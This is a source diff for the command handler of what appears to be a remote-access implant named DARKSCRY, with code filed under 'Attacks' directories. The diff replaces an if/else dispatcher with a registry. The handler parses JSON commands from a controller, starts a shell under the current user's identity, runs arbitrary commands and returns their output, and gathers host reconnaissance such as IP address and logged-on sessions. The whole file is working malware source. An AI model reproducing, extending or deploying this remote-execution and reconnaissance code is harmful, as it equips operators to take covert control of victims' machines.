@@ -1,155 +1,108 @@
 #define NOMINMAX
-
 #include "CommandHandler.h"
+
 #include "Logger/GlobalLogger.h"
-#ifdef _WIN32
-#include "collection/system_information/windows_basic_info.hpp"
-#else
-#include "collection/system_information/linux_basic_info.hpp"
-#endif
-#include <algorithm>
-#include <rapidjson/document.h>
+#include "serialization/MachineInfoSerializer.h"
 #include <rapidjson/writer.h>
 #include <rapidjson/stringbuffer.h>
 
+#include "Attacks/Collection/sysinfo.hpp"
+#include "Attacks/Execution/Shell.hpp"
+
+
 using namespace CppAgent;
+using rapidjson::Document;
+using rapidjson::Value;
 
-namespace {
-    std::string make_response(bool success,
-        const std::string* output = nullptr,
-        const char* error = nullptr) {
-        rapidjson::Document d;
-        d.SetObject();
-        auto& alloc = d.GetAllocator();
-        d.AddMember("success", success, alloc);
-
-        if (output) {
-            rapidjson::Value data(rapidjson::kObjectType);
-            data.AddMember("output", rapidjson::Value(output->c_str(), alloc), alloc);
-            d.AddMember("data", data, alloc);
-        }
-        else {
-            d.AddMember("data", rapidjson::Value(rapidjson::kNullType), alloc);
-        }
-
-        if (error) {
-            d.AddMember("error", rapidjson::Value(error, alloc), alloc);
-        }
-        else {
-            d.AddMember("error", rapidjson::Value(rapidjson::kNullType), alloc);
-        }
-
-        rapidjson::StringBuffer buffer;
-        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
-        d.Accept(writer);
-        return buffer.GetString();
-    }
-} // namespace
-
-CommandHandler::CommandHandler() : shell_running_(false) {}
-
-std::string CommandHandler::handle(const std::string& commandJson) {
-	DARKSCRY_LOG("Received command: " + commandJson, Logger::Level::Debug);
-    rapidjson::Document doc;
-    if (doc.Parse(commandJson.c_str()).HasParseError() || !doc.IsObject()) {
-        DARKSCRY_LOG("Invalid JSON", Logger::Level::Warning);
-        return make_response(false, nullptr, "invalid json");
-    }
-
-    int action = 0;
-    if (doc.HasMember("action_id") && doc["action_id"].IsInt())
-        action = doc["action_id"].GetInt();
-    else if (doc.HasMember("action") && doc["action"].IsInt())
-        action = doc["action"].GetInt();
-    else {
-        DARKSCRY_LOG("No action provided", Logger::Level::Warning);
-        return make_response(false, nullptr, "missing action");
-    }
-
-    if (action == START_SHELL_INSTANCE) {
-#ifdef _WIN32
-        if (!shell_)
-            shell_ = std::make_unique<win32::Shell>();
-        shell_running_ = shell_->create_by_sid(L"CURRENT_USER");
-#else
-        if (!shell_)
-            shell_ = std::make_unique<linux_os::Shell>();
-        shell_running_ = shell_->create();
-#endif
-        if (!shell_running_) {
-            return make_response(false, nullptr, "failed to start shell");
-        }
-        DARKSCRY_LOG("Start shell instance requested", Logger::Level::Info);
-        return make_response(true);
-    }
-    else if (action == RUN_COMMAND) {
-        if (!shell_running_) {
-            DARKSCRY_LOG("Run command but shell not running", Logger::Level::Warning);
-            return make_response(false, nullptr, "Shell is not running");
-        }
-
-        std::string cmd;
-        if (doc.HasMember("command")) {
-            auto& c = doc["command"];
-            if (c.IsObject() && c.HasMember("command") && c["command"].IsString())
-                cmd = c["command"].GetString();
-            else if (c.IsString())
-                cmd = c.GetString();
-        }
-
-        DARKSCRY_LOG("Run command: " + cmd, Logger::Level::Debug);
-#ifdef _WIN32
-        std::string output = shell_->run_command(cmd);
-#else
-        std::string output = shell_->run_command(cmd);
-#endif
-        return make_response(true, &output);
-    }
-#ifdef _WIN32
-    else if (action == GET_BASIC_MACHINE_INFO) {
-        auto info = win32::sysinfo::get_basic_machine_info();
-#else
-    else if (action == GET_BASIC_MACHINE_INFO) {
-        auto info = linux_os::sysinfo::get_basic_machine_info();
-#endif
-
-        rapidjson::Document d;
-        d.SetObject();
-        auto& alloc = d.GetAllocator();
-        d.AddMember("success", true, alloc);
-
-        rapidjson::Value machine(rapidjson::kObjectType);
-        machine.AddMember("HostName", rapidjson::Value(info.host_name.c_str(), alloc), alloc);
-        machine.AddMember("OperatingSystem", rapidjson::Value(info.operating_system.c_str(), alloc), alloc);
-        machine.AddMember("OSVersionDetail", rapidjson::Value(info.os_version_detail.c_str(), alloc), alloc);
-        machine.AddMember("CPU", rapidjson::Value(info.cpu.c_str(), alloc), alloc);
-        machine.AddMember("RAM", rapidjson::Value(info.ram.c_str(), alloc), alloc);
-        machine.AddMember("Disk", rapidjson::Value(info.disk.c_str(), alloc), alloc);
-        machine.AddMember("PrimaryIP", rapidjson::Value(info.primary_ip.c_str(), alloc), alloc);
-        machine.AddMember("GPU", rapidjson::Value(info.gpu.c_str(), alloc), alloc);
-        machine.AddMember("AgentStatus", rapidjson::Value("Active and Monitoring", alloc), alloc);
-        if (!info.logged_on_sessions.empty())
-            machine.AddMember("LastLogin", rapidjson::Value(info.logged_on_sessions.front().c_str(), alloc), alloc);
-        else
-            machine.AddMember("LastLogin", rapidjson::Value("", alloc), alloc);
-
-        rapidjson::Value sessions(rapidjson::kArrayType);
-        for (auto& s : info.logged_on_sessions)
-            sessions.PushBack(rapidjson::Value(s.c_str(), alloc), alloc);
-        machine.AddMember("LogedInSessions", sessions, alloc);
-
-        rapidjson::Value data(rapidjson::kObjectType);
-        data.AddMember("machine_info", machine, alloc);
-        d.AddMember("data", data, alloc);
-        d.AddMember("error", rapidjson::Value(rapidjson::kNullType), alloc);
-
-        rapidjson::StringBuffer buffer;
-        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
-        d.Accept(writer);
-        return buffer.GetString();
-    }
-
-    DARKSCRY_LOG("Unknown action: " + std::to_string(action), Logger::Level::Warning);
-    return make_response(false, nullptr, "unknown action");
+CommandHandler::CommandHandler()
+{
+    registry_.emplace(StartShell,          &CommandHandler::onStartShell);
+    registry_.emplace(RunCommand,          &CommandHandler::onRunCommand);
+    registry_.emplace(GetBasicMachineInfo, &CommandHandler::onGetBasicMachineInfo);
 }
 
+std::string CommandHandler::handle(std::string_view reqJson)
+{
+    Document d;
+    if (d.Parse(reqJson.data(), reqJson.size()).HasParseError() || !d.IsObject())
+        return makeError("JSON parse error");
+
+    int cmdId{};
+    if (!json::getInt(d, "action_id", cmdId) && !json::getInt(d, "action", cmdId))
+        return makeError("Missing action_id");
+	DARKSCRY_LOG("CommandHandler: action_id = " + std::to_string(cmdId), Logger::Level::Debug);
+
+    auto it = registry_.find(cmdId);
+    if (it == registry_.end())
+        return makeError("Unknown action");
+
+    try {
+        return std::invoke(it->second, this, std::cref(d));
+    } catch (const std::exception& ex) {
+        DARKSCRY_LOG(ex.what(), Logger::Level::Error);
+        return makeError(ex.what());
+    }
+}
+
+std::string CommandHandler::onStartShell(const Document&)
+{
+	if (!shell_) shell_ = std::make_unique<execution::Shell>();
+#ifdef _WIN32
+    shellRunning_ = shell_->create_by_sid(L"CURRENT_USER");
+#else
+    shellRunning_ = shell_->create();
+#endif
+    return shellRunning_ ? makeSuccess(Value(rapidjson::kNullType))
+                         : makeError("Shell start failed");
+}
+
+std::string CommandHandler::onRunCommand(const Document& req)
+{
+    if (!shellRunning_)
+        return makeError("Shell not running");
+
+    std::string cmd;
+    json::getString(req, "command", cmd);
+
+    std::string out = shell_->run_command(cmd);
+    Document d; d.SetObject();
+    d.AddMember("output", Value(out.c_str(), d.GetAllocator()), d.GetAllocator());
+    return makeSuccess(d);
+}
+
+std::string CommandHandler::onGetBasicMachineInfo(const Document&)
+{
+	auto info = sysinfo::get_basic_machine_info();
+
+    Document tmp; tmp.SetObject();
+    tmp.AddMember("machine_info", serialization::toJson(info, tmp.GetAllocator()), tmp.GetAllocator());
+    return makeSuccess(tmp["machine_info"]);
+}
+
+std::string CommandHandler::makeSuccess(const Value& data)
+{
+    Document d; d.SetObject();
+    auto& a = d.GetAllocator();
+    d.AddMember("success", true, a);
+    d.AddMember("data",    Value(data, a), a);
+    d.AddMember("error",   Value(rapidjson::kNullType), a);
+
+    rapidjson::StringBuffer buf;
+    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
+    d.Accept(wr);
+    return buf.GetString();
+}
+
+std::string CommandHandler::makeError(const char* msg)
+{
+    Document d; d.SetObject();
+    auto& a = d.GetAllocator();
+    d.AddMember("success", false, a);
+    d.AddMember("data",    Value(rapidjson::kNullType), a);
+    d.AddMember("error",   Value(msg, a), a);
+
+    rapidjson::StringBuffer buf;
+    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
+    d.Accept(wr);
+    return buf.GetString();
+}
